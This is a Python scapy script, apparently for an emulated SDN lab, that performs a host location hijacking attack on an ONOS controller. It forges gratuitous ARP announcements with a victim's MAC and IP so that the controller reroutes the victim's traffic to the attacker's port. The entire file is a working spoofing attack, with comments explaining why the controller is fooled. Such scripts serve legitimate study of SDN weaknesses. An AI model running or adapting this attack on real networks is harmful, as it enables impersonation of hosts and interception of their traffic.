#!/usr/bin/env python3
"""
Host Location Hijacking Attack (HLHA)
-------------------------------------
The attacker (atk, on switch s3) impersonates the victim (h1, on s1)
by sending a packet whose SOURCE is h1's MAC address. The ONOS
controller, which trusts the source field without verifying it,
concludes that h1 has 'moved' to the attacker's port and updates
its host table. Traffic destined for h1 is then forwarded to atk.
"""

from scapy.all import Ether, ARP, sendp

# --- Target details (read straight from ONOS 'hosts' table) ---
VICTIM_MAC     = "00:00:00:00:00:02"   # h1's MAC  <-- the "name" we steal
VICTIM_IP      = "10.0.10.11"          # h1's IP
ATTACKER_IFACE = "atk-eth0"            # the attacker's own port (lives on s3)

# --- Forge the lie ---
# The Ethernet SOURCE = h1's MAC. THIS single field is what fools ONOS.
# We wrap it in a gratuitous ARP so the switch punts it up to the controller.
pkt = Ether(src=VICTIM_MAC, dst="ff:ff:ff:ff:ff:ff") / \
      ARP(op=2,                      # ARP reply / announcement
          hwsrc=VICTIM_MAC,          # "I am h1's MAC..."
          psrc=VICTIM_IP,            # "...with h1's IP"
          hwdst="ff:ff:ff:ff:ff:ff",
          pdst=VICTIM_IP)

print(f"[*] Impersonating victim {VICTIM_IP} ({VICTIM_MAC}) out of {ATTACKER_IFACE}")
sendp(pkt, iface=ATTACKER_IFACE, count=5, inter=1, verbose=True)
print("[*] Done. Now check ONOS 'hosts' — h1 should have moved to s3.")
